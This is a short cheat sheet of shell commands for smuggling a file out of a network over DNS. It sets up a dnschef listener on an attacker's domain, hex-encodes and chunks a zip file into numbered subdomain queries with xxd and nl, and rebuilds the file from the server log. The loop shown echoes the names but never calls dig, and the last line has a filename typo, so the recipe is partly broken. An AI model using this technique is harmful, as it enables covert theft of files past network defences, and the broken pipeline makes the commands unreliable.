### 1 - Run dns server on domain 

./dnschef.py -i <public ip> --fakeip 127.0.0.1 --logfile <logfile>

### 2 - Exfil file using xxd and dig

xxd -p -c 8 4digits.hex.zip |  nl -s"." -nrz -w5 | while read h; do echo $h.<domain>; done

  xxd => hexdump in columns of 8 width
  
  nl => line numbering (-s = delimiter; -nrz = number format; -w width)
  
  dig => DNS request
  
### 3 - Re-assemble packets

cat <logfile> | grep <domain> | awk '{print $12}' | sort -h | cut -d. -f2 > <logfile.hex>
xxd -r -p <logile.hex>

